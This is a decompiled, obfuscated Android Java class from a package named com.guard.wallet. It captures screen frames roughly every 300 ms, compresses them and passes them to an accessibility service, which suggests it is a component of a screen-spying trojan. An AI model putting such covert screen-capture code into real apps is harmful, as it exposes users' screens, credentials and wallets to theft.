package x;

import a1.q;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.media.Image;
import android.media.ImageReader;
import android.media.Image.Plane;
import android.media.ImageReader.OnImageAvailableListener;
import android.util.Log;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.g;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;

public final class b implements OnImageAvailableListener {
   public final AtomicReference a = new AtomicReference();
   public final AtomicLong b = new AtomicLong(0L);

   public final void onImageAvailable(ImageReader var1) {
      Image var8 = var1.acquireLatestImage();
      if (var8 != null) {
         long var5 = System.currentTimeMillis();
         AtomicLong var7 = this.b;
         if (var5 - var7.get() > 300L) {
            try {
               int var2 = var8.getWidth();
               int var3 = var8.getHeight();
               Plane[] var12 = var8.getPlanes();
               ByteBuffer var9 = var12[0].getBuffer();
               int var4 = var12[0].getPixelStride();
               var11 = Bitmap.createBitmap(var2 + (var12[0].getRowStride() - var4 * var2) / var4, var3, Config.ARGB_8888);
               var11.copyPixelsFromBuffer(var9);
            } catch (Exception var10) {
               q.s("BitmapUtils", var10);
               var11 = null;
            }

            if (var11 != null) {
               Log.d("x.b", "new Bitmap is Save");
               AtomicReference var14 = this.a;
               g.J0((Bitmap)var14.get());
               var14.set(var11);
               byte[] var13 = g.M0(var11, 0.25F, 25);
               if (MyAccessibilityService.P() != null) {
                  MyAccessibilityService.P().getClass();
                  MyAccessibilityService.a0(var13);
               }
            }

            var7.set(var5);
         }

         var8.close();
      }
   }
}
